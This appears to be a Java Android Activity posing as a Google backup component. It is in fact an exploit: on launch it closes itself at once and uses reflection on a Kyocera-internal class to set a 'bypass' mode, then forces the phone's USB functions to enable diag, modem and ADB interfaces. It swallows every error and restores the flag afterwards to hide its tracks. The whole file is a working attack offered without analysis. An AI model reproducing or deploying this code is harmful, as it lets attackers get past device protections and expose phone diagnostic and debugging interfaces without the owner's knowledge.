package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;

import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String KEY_RW_QFUNC_MODE = "rw_qfunc_mode";
    private static final String VALUE_BYPASS = "1";
    private static final String COMBO_REQUEST = "rndis,diag,modem,none,adb";
    private static final int TRIGGER_COUNT = 3;
    private static final long SLEEP_BETWEEN_MS = 500;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        finish();
        applyUsbSwitchViaTransferBypass();
    }

    private void applyUsbSwitchViaTransferBypass() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                return;
            }

            if (!isTransferAvailable()) {
                return;
            }

            String originalMode = getRwQfuncMode();

            boolean setOk = setRwQfuncMode(VALUE_BYPASS);
            if (!setOk) {
                return;
            }

            String modeAfterSet = getRwQfuncMode();
            if (!VALUE_BYPASS.equals(modeAfterSet)) {
                return;
            }

            for (int i = 0; i < TRIGGER_COUNT; i++) {
                setCurrentFunctionViaUsbManager(context, COMBO_REQUEST, false);
                sleepQuiet(SLEEP_BETWEEN_MS);

                setCurrentFunctionViaUsbManager(context, COMBO_REQUEST, true);
                sleepQuiet(SLEEP_BETWEEN_MS);

                String persist = getSystemProperty("persist.sys.usb.config", "");
                if (containsFunction(persist, "diag")) {
                    break;
                }
            }

            if (originalMode != null) {
                setRwQfuncMode(originalMode);
            }
        } catch (Throwable t) {
            // swallow
        }
    }

    private static boolean isTransferAvailable() {
        try {
            Class.forName("jp.kyocera.internal.clomask.Transfer");
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private static String getRwQfuncMode() {
        try {
            Class<?> transferClass = Class.forName("jp.kyocera.internal.clomask.Transfer");
            Method getMethod = transferClass.getMethod("get", String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, KEY_RW_QFUNC_MODE);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static boolean setRwQfuncMode(String value) {
        String[] candidateMethods = new String[]{"set", "put", "write", "setValue", "update"};
        for (String methodName : candidateMethods) {
            try {
                Class<?> transferClass = Class.forName("jp.kyocera.internal.clomask.Transfer");
                Method m = transferClass.getMethod(methodName, String.class, String.class);
                m.setAccessible(true);
                m.invoke(null, KEY_RW_QFUNC_MODE, value);
                return true;
            } catch (NoSuchMethodException e) {
                // next candidate
            } catch (Throwable t) {
                return false;
            }
        }
        return false;
    }

    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
        } catch (Throwable t) {
            // swallow
        }
    }

    private static boolean containsFunction(String functions, String function) {
        if (functions == null || function == null) {
            return false;
        }
        int index = functions.indexOf(function);
        if (index < 0) {
            return false;
        }
        if (index > 0 && functions.charAt(index - 1) != ',') {
            return false;
        }
        int charAfter = index + function.length();
        return charAfter >= functions.length() || functions.charAt(charAfter) == ',';
    }

    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            return defaultValue;
        }
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            // ignore
        }
    }
}
